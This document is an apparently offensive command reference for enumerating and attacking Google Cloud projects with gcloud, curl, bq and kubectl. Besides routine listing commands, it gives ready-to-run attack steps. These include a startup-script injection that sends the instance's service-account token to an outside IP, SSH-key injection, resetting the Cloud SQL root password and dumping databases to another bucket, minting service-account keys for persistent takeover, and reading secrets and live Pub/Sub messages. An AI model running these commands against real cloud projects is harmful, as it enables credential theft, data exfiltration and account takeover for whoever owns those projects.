# GCP Sweep — Full Command Reference

All commands take `--project <p>` (or `gcloud config set project <p>` first) and
`--format=json` for parsing. Add `--impersonate-service-account=SA` to run any
command as another SA you hold TokenCreator on.

## 1. Identity, projects, IAM

```bash
gcloud auth list --format=json
gcloud projects list --format=json
gcloud projects describe project-id-1 --format=json      # works even if list is empty
gcloud organizations list --format=json
gcloud resource-manager folders list --organization=ORG_ID --format=json
gcloud projects get-iam-policy project-id-1 --format=json
gcloud organizations get-iam-policy ORG_ID --format=json
gcloud resource-manager folders get-iam-policy FOLDER_ID --format=json
gcloud iam service-accounts list --format=json
gcloud iam service-accounts describe sa@project-id-1.iam.gserviceaccount.com --format=json
gcloud iam service-accounts get-iam-policy sa@project-id-1.iam.gserviceaccount.com --format=json
gcloud iam service-accounts keys list --iam-account sa@project-id-1.iam.gserviceaccount.com --format=json
gcloud iam roles list --project project-id-1 --format=json         # custom roles
gcloud iam roles describe roles/editor --format=json               # role -> permission list
gcloud services list --enabled --format=json                       # which APIs are on
gcloud asset search-all-resources --scope=projects/project-id-1 --format=json
gcloud asset search-all-iam-policies --scope=organizations/ORG_ID --query="policy:allUsers" --format=json
```

IAM-policy triage: grep bindings for `allUsers`, `allAuthenticatedUsers`,
`roles/owner`, `roles/editor`, `roles/iam.serviceAccountTokenCreator`,
`roles/iam.serviceAccountUser`, `roles/iam.serviceAccountKeyAdmin`,
`roles/iam.securityAdmin`, `roles/cloudbuild.builds.editor`,
`roles/deploymentmanager.editor`, `roles/compute.admin`.

## 2. testIamPermissions — effective-permission discovery

Every major resource type exposes `testIamPermissions`. POST candidate
permissions (<=100 per call, no wildcards); response contains only the ones you
hold. Denied permissions are silently omitted — perfect for blind probing.

```bash
TOKEN=$(gcloud auth print-access-token)
AUTH=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json")

# Project scope:
curl -s -X POST "${AUTH[@]}" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/project-id-1:testIamPermissions" \
  -d '{"permissions":[
    "resourcemanager.projects.get","resourcemanager.projects.setIamPolicy",
    "iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.implicitDelegation","iam.serviceAccountKeys.create",
    "iam.roles.update","compute.instances.list","compute.instances.setMetadata",
    "compute.projects.setCommonInstanceMetadata","compute.instances.osAdminLogin",
    "storage.buckets.list","storage.objects.list","storage.buckets.setIamPolicy",
    "secretmanager.secrets.list","secretmanager.versions.access",
    "cloudfunctions.functions.create","cloudfunctions.functions.sourceCodeGet",
    "run.services.create","container.clusters.getCredentials",
    "cloudbuild.builds.create","deploymentmanager.deployments.create",
    "cloudsql.instances.list","bigquery.datasets.get","pubsub.subscriptions.consume",
    "orgpolicy.policy.set","serviceusage.services.enable"]}'

# Specific service account (actAs probing):
curl -s -X POST "${AUTH[@]}" \
  "https://iam.googleapis.com/v1/projects/project-id-1/serviceAccounts/sa@project-id-1.iam.gserviceaccount.com:testIamPermissions" \
  -d '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccountKeys.create","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccounts.implicitDelegation"]}'

# Specific compute instance:
curl -s -X POST "${AUTH[@]}" \
  "https://compute.googleapis.com/compute/v1/projects/project-id-1/zones/us-central1-a/instances/web-01:testIamPermissions" \
  -d '{"permissions":["compute.instances.setMetadata","compute.instances.get","compute.instances.getSerialPortOutput","compute.instances.osLogin","compute.instances.setServiceAccount"]}'

# Specific bucket (storage API uses GET with query params):
curl -s "${AUTH[@]}" \
  "https://storage.googleapis.com/storage/v1/b/example-bucket/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.buckets.setIamPolicy"
```

To brute the full catalog: pull all testable permissions from
`https://iam.googleapis.com/v1/permissions:queryTestablePermissions` (POST
`{"fullResourceName":"//cloudresourcemanager.googleapis.com/projects/project-id-1"}`,
paginate with `pageToken`), then chunk by 100 through `testIamPermissions`.

Privesc-grade hits (hand to `cloud-privilege-escalation`):
`setIamPolicy` anywhere; `iam.serviceAccountKeys.create`;
`iam.serviceAccounts.getAccessToken`/`signBlob`/`signJwt`/`implicitDelegation`;
`actAs` + any service that runs code (`cloudfunctions.functions.create`,
`run.services.create`, `cloudbuild.builds.create`, `compute.instances.create`,
`dataproc`, `deploymentmanager.deployments.create` — DM runs as the project's
`<num>@cloudservices.gserviceaccount.com` Editor SA); `iam.roles.update` on a
custom role you hold; `compute.instances.setMetadata` /
`compute.projects.setCommonInstanceMetadata` (ssh-key or startup-script
injection); `orgpolicy.policy.set`.

## 3. Compute

```bash
gcloud compute instances list --format=json
gcloud compute instances describe web-01 --zone us-central1-a --format=json
#   .metadata.items[]: startup-script, startup-script-url, ssh-keys, kube-env (GKE nodes!)
#   .serviceAccounts[]: email + oauth scopes  <- cloud-platform scope = jackpot
#   .networkInterfaces[].accessConfigs[].natIP  <- public IP
gcloud compute instances get-serial-port-output web-01 --zone us-central1-a   # boot logs: tokens, paths, creds
gcloud compute project-info describe --format=json       # project-wide metadata/ssh-keys
gcloud compute ssh web-01 --zone us-central1-a           # if OS Login / metadata keys allow
# Exec without SSH access — metadata injection (needs setMetadata + actAs instance SA):
gcloud compute instances add-metadata web-01 --zone us-central1-a \
  --metadata ssh-keys="pwn:$(cat pwn.pub | sed 's/$/ pwn/')"
gcloud compute instances add-metadata web-01 --zone us-central1-a \
  --metadata startup-script='curl -s -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/default/token" | curl -s -X POST -d @- https://203.0.113.50/t'
gcloud compute instances reset web-01 --zone us-central1-a    # trigger startup script
gcloud compute disks list --format=json
gcloud compute snapshots list --format=json
gcloud compute snapshots create loot --source-disk web-01 --source-disk-zone us-central1-a  # mount on your own VM
gcloud compute images list --no-standard-images --format=json
gcloud compute addresses list --format=json
gcloud compute forwarding-rules list --format=json
gcloud compute firewall-rules list --format=json \
  --filter="sourceRanges:(0.0.0.0/0)"                     # internet-exposed ports
gcloud compute networks list --format=json
gcloud compute networks peerings list --format=json       # cross-project pivot paths
gcloud compute os-login ssh-keys list --format=json
```

## 4. Storage (GCS)

```bash
gcloud storage ls --format=json                 # all buckets in project
gcloud storage ls -r gs://example-bucket/       # recursive object list
gcloud storage ls -L gs://example-bucket        # bucket metadata incl. ACL mode
gcloud storage cp gs://example-bucket/terraform.tfstate .
gsutil ls -L -b gs://example-bucket             # legacy equivalent
gsutil iam get gs://example-bucket              # bindings: allUsers = public
gsutil acl get gs://example-bucket/obj
# Unauthenticated check for a public bucket:
curl -s "https://storage.googleapis.com/storage/v1/b/example-bucket/o"
```

Loot priorities: `*.tfstate`, `*backup*`, `*.sql`, `cloudbuild.yaml`, GKE
`kube-env` dumps, SA key `*.json`. Mass triage -> `cloud-storage-exposure`.

## 5. Serverless: Functions, Cloud Run, App Engine

```bash
gcloud functions list --format=json
gcloud functions describe fn1 --region us-central1 --format=json
#   .serviceConfig.environmentVariables  <- secrets
#   .serviceConfig.serviceAccountEmail   <- runtime identity
# Source download (gen2 / gen1):
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "https://cloudfunctions.googleapis.com/v2/projects/project-id-1/locations/us-central1/functions/fn1:generateDownloadUrl" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["downloadUrl"])'
# Invoke a private function/service with an identity token:
curl -s -H "Authorization: Bearer $(gcloud auth print-identity-token)" https://fn1-abc123-uc.a.run.app

gcloud run services list --format=json          # .status.url = endpoint (may be public)
gcloud run services describe svc1 --region us-central1 --format=json
#   .spec.template.spec.containers[].env, .serviceAccountName, ingress annotation
gcloud run revisions list --service svc1 --region us-central1 --format=json
gcloud app services list --format=json; gcloud app versions list --format=json
gcloud app instances list --format=json
```

## 6. GKE, databases, analytics

```bash
gcloud container clusters list --format=json
#   .masterAuthorizedNetworksConfig, .nodeConfig.serviceAccount + .oauthScopes,
#   .endpoint (public master IP), legacyAbac
gcloud container clusters get-credentials prod --zone us-central1-a --project project-id-1
kubectl get secrets -A -o json                   # continue in the k8s attack flow

gcloud sql instances list --format=json
#   .ipAddresses[] (PRIMARY=public), .settings.ipConfiguration.authorizedNetworks
gcloud sql users list --instance=db1 --format=json
gcloud sql users set-password root --host=% --instance=db1 --password 'Pwn3d!'   # if cloudsql.users.update
gcloud sql backups list --instance=db1 --format=json
gcloud sql export sql db1 gs://your-bucket/dump.sql --database=app     # exfil via GCS

bq ls --format=json
bq ls --format=json project-id-1:dataset1
bq show --format=json project-id-1:dataset1.users        # .access[] with allUsers = public dataset
bq head -n 100 project-id-1:dataset1.users
bq query --use_legacy_sql=false --format=json 'SELECT * FROM `project-id-1.dataset1.users` LIMIT 100'
gcloud spanner instances list --format=json
gcloud firestore databases list --format=json
gcloud redis instances list --region=us-central1 --format=json
```

## 7. Secrets, messaging, CI, registries, misc

```bash
gcloud secrets list --format=json
gcloud secrets versions list NAME --format=json
gcloud secrets versions access latest --secret=NAME                 # plaintext
gcloud secrets get-iam-policy NAME --format=json

gcloud pubsub topics list --format=json
gcloud pubsub subscriptions list --format=json
gcloud pubsub subscriptions pull SUB --limit=50 --auto-ack --format=json   # live message loot

gcloud builds list --format=json
gcloud builds describe BUILD_ID --format=json      # steps, substitutions, logsBucket, source bucket
gcloud builds log BUILD_ID                          # build logs leak tokens/creds
# cloudbuild.builds.create = run code as the Cloud Build SA (often Editor) -> privesc

gcloud artifacts repositories list --format=json
gcloud artifacts docker images list us-docker.pkg.dev/project-id-1/repo1 --format=json
gcloud auth configure-docker us-docker.pkg.dev && docker pull us-docker.pkg.dev/project-id-1/repo1/app:latest
gcloud container images list --format=json          # legacy gcr.io

gcloud iam service-accounts keys create loot-key.json \
  --iam-account sa@project-id-1.iam.gserviceaccount.com   # PRIVESC: durable SA takeover
gcloud deployment-manager deployments list --format=json
gcloud scheduler jobs list --location=us-central1 --format=json   # jobs with OAuth/OIDC SA targets
gcloud kms keyrings list --location=global --format=json
gcloud kms keys list --keyring=kr --location=global --format=json
gcloud logging read 'protoPayload.methodName:"GenerateAccessToken"' --limit 50 --format=json
gcloud dns managed-zones list --format=json; gcloud dns record-sets list --zone=z1 --format=json
```

## 8. Token-only REST operation

With only an access token (metadata theft, leaked `access_token`):

```bash
TOKEN=ya29....
H="Authorization: Bearer $TOKEN"
curl -s -H "$H" "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$TOKEN"  # scopes + principal
curl -s -H "$H" "https://cloudresourcemanager.googleapis.com/v1/projects"
curl -s -H "$H" "https://compute.googleapis.com/compute/v1/projects/project-id-1/aggregated/instances"
curl -s -H "$H" "https://storage.googleapis.com/storage/v1/b?project=project-id-1"
curl -s -H "$H" "https://secretmanager.googleapis.com/v1/projects/project-id-1/secrets"
curl -s -X POST -H "$H" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@project-id-1.iam.gserviceaccount.com:generateAccessToken" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'   # impersonation
```

Paginate with `pageToken`. `tokeninfo` first, always — it tells you the SA email
and the OAuth **scopes**, which cap the token regardless of IAM (a
`devstorage.read_only` token can only hit GCS APIs even for a project Owner SA).

## 9. What leaks where (triage priorities)

| Found | Means |
|---|---|
| `secrets versions access` works | plaintext creds immediately |
| SA key creation permitted | permanent SA takeover; mint and store the key |
| actAs/TokenCreator on an SA | impersonation chain; check implicitDelegation for multi-hop |
| Instance SA with cloud-platform scope | metadata token = that SA's full IAM power |
| startup-script / kube-env in metadata | creds, bootstrap tokens, cluster CA |
| Serial-port output | OS creds, tokens printed at boot, SSH host keys |
| Bucket with allUsers binding | public exposure -> cloud-storage-exposure finding |
| cloudbuild/deploymentmanager create | code exec as powerful default SAs -> cloud-privilege-escalation |
| Cloud SQL public IP + authorizedNetworks 0.0.0.0/0 | direct DB attack surface |
| Pub/Sub consume | live data stream exfil |
| Function/Run env + source | secrets + code review -> trufflehog |
